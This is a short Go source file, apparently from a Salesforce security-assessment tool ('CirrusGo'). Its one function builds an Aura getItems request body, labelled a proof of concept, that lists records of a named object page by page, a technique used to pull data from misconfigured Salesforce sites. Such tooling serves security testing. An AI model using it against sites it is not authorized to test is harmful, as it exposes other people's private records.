package salesforce

import (
	"encoding/json"
	"fmt"
)

func PayloadGeneratorGetItems(objectName string, page_size int, page int) []byte {

	payload1 := `[{"id":"CirrusGo","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"`
	payload2 := objectName
	payload3 := `","layoutType":"FULL",`
	payload4 := fmt.Sprintf(`"pageSize":%d`, page_size)
	payload5 := fmt.Sprintf(`,"currentPage":%d`, page)
	payload6 := `,"useTimeout":false,"getCount":true,"enableRowActions":false}}]`
	finalpayload := []byte(payload1 + payload2 + payload3 + payload4 + payload5 + payload6)

	p := payload{
		Massage: json.RawMessage(finalpayload),
	}
	genPOC, err := json.Marshal(p)

	if err != nil {
		panic(err)

	}
	return genPOC
}
